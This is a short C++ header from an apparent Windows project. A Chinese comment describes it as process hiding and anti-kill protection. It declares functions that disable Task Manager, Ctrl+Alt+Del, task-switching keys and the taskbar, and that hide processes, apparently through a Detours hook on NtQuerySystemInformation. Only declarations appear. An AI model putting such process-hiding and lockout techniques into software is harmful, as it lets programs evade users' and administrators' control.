/********************************************************************
* 描    述：  进程隐藏win2000 进程防杀winxp,server2003
* 作    者：  孙涛
* 版 本 号：  1.0
* 完成日期：  20090326
********************************************************************/

#pragma once
#include "../DetourDll/DetourDll.h"

//////////////////
// Use this class to disable task keys, task manager and/or the taskbar.
// Call Disable with flags for items you want to disable; for example:
//
// CTaskMgrKeys::Disable(CTaskMgrKeys::ALL);
// 
class  CTaskKeyMgr {
public:
	enum {
		TASKMGR  = 0x01,	// disable task manager (Ctrl+Alt+Del)
		TASKKEYS = 0x02,	// disable task keys (Alt-TAB, etc)
		TASKBAR  = 0x04,	// disable task bar
		TASKLIST  = 0x08,	// disable listing process list
		CTRLALTDEL  = 0x10,	// disable Ctrl+Alt+Del
		ALL=0xFFFF			// disable everything :(
	};
	static void Disable(DWORD dwItem,BOOL bDisable,BOOL bBeep=FALSE);

	static BOOL IsProcessListItemDisabled();
protected:
	static	HINSTANCE	hMyMyNtQuerySystemInformation;
};

BOOL  Is_Win2000();
BOOL Is_Win2000_SP1_or_Later();
BOOL Is_Win2000_Professional();
BOOL LoadSafeProcess();
void UnLoadSafeProcess();

